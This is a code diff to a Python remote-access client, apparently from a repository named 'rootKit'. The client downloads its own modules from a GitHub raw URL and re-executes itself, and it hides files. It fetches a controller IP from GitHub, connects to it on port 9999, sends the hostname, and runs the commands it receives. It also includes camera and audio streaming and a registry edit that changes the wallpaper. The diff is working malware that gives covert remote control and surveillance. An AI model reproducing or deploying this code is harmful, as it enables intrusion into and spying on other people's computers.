@@ -1,7 +1,16 @@
-listFileDepency = ['fct.py', 'scripter.py', 'sound.py']
+listFileDepency = ['scripter.py', 'sound.py']
 hideFile = ["__pycache__"]
 githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
-
+import socket
+def connected():
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect(("www.google.com", 80))
+        sock.close()
+        return True
+    except:
+        sock.close()
+        return False
 
 import subprocess, os, requests, time, threading, select
 try:
@@ -12,12 +21,17 @@ except:
 try:
     from file import File
 except:
-    with open("file.py", 'w'):
-            pass
-    with open("file.py", "a") as file:
-        for line in requests.get(f"{githubUrl}file.py").text.split('\n'):
-            file.write(line)
-    from file import File
+    if connected():
+        with open("file.py", 'w'):
+                pass
+        with open("file.py", "a") as file:
+            for line in requests.get(f"{githubUrl}file.py").text.split('\n'):
+                file.write(line)
+        from file import File
+        os.system(os.path.basename(__file__))
+        exit()
+    else:
+        exit()
 
 
 f = File(os.getcwd().replace('\\', '/')+"/")
@@ -25,7 +39,10 @@ for file in hideFile:
     f.hide(file)
 for file in listFileDepency:
     f.modify(file, githubUrl+file)
-from fct import *
+
+def getpath(change=False):                          return os.getcwd() if change in (False, "not", "\\") else os.getcwd().replace('\\', '/')
+def getSelfFileName():                              return os.path.basename(__file__)
+
 from sound import Sound
 import scripter
 s = Sound()
@@ -40,8 +57,6 @@ RATE = 44100
 CHUNK = 4096
 audio = pyaudio.PyAudio()
 
-
-ipScreen = f.getByGithub(f"{githubUrl}ip").replace("\n", "")
 
 def camera(port):
     client = CameraClient(ipScreen, port)
@@ -94,10 +109,10 @@ def terminal(command):
 
 def wallpaper(data):
     importImg(data)
-    severalcmd('reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True §!§reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Imge.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True§!§reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f §!§RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True ')
+    severalcmd('reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f 98!89RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True 98!89reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Imge.jpg'+' /f 98!89RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True98!89reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f 98!89RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True ')
     
 def severalcmd(data, temp=0.05):
-    datalist = data.split("§!§")
+    datalist = data.split("98!89")
     for i in datalist:
         print(i)
         terminal(i)
@@ -148,12 +163,13 @@ def receive(timeoutKill):
             print(receive)
             progrun = False
             run = False
-        if receive != "●":
+        if receive != "9":
             return receive
 
 def execute(data):
     global run, sortir, ossys, reloading
-    data = data.replace("●", "")
+    data = data.replace("9", "")
+    data = data.replace("1+8", "9")
     datalist = data.split()
     if not datalist:
         return None
@@ -200,11 +216,13 @@ run, progrun = True, True
 timeoutKill = 2000
 
 while True:
+    ipScreen = f.getByGithub(f"{githubUrl}ip").replace("\n", "")
+    print(ipScreen)
     print("ready")
     BREAK = False
     run = True
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ipScreen, 9999))
         s.send(str(lib_platform.hostname).encode())
     except:
